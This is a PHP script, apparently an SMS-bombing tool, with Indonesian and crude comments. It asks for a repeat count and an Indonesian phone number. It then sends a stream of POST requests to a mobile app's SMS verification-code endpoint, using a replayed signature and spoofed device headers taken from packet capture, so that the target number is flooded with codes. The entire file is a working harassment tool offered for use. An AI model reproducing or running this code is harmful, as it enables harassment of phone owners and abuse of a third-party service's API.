<?php
//SGB TEM
//ORIABLE TOOLS
//AHYAR
//AGWJY
//ikiganteng
//SHARE IT AUTO DRAW KNTL KNTL KNTL
//EDIT CURLOPT_FIELDNYA,dibagian IDENTYTYD ID,TRACE_ID,DEVICE IDNYA JUGAX HEHEHEH
//GET Pakai PACKETCAPTURE 
date_default_timezone_set("Asia/Jakarta");
function read ($length='255') 
{ 
   if (!isset ($GLOBALS['StdinPointer'])) 
   { 
      $GLOBALS['StdinPointer'] = fopen ("php://stdin","r"); 
   } 
   $line = fgets ($GLOBALS['StdinPointer'],$length); 
   return trim ($line); 
} 
function add($code){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://i.kaixindou.net/uaas/sms/sendCode");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "timestamp=1533657825710&appId=ikxd&sign=1cbe66ed37cd689159b67f9733b5530fe0869c616795946190eaaae436161b6a&oper_type=0&country_code=62&mobile=".$code."&nonstr=15336578257102333");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = "X-DeviceType: Xiaomi Redmi Note 4X";
    $headers[] = "X-Os-Ver: 6.0";
    $headers[] = "X-Auth-Token: ";
    $headers[] = "X-OsType: android";
    $headers[] = "X-Client-Net: 1";
    $headers[] = "X-DeviceId: 275de3449fbdf8f73446b74c93582097";
    $headers[] = "Host: i.kaixindou.net";
    $headers[] = "User-Agent: okhttp/3.8.1";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $result = curl_exec($ch);
    if(curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close ($ch);
    
    echo $result;
}
echo "Input Jumlah: ";
$jumlah = read();
echo "Input Nomor(62): ";
$no = read();
for ($x = 0; $x <= $jumlah; $x++){
    $go = add($no);
    echo $go."\n";
}
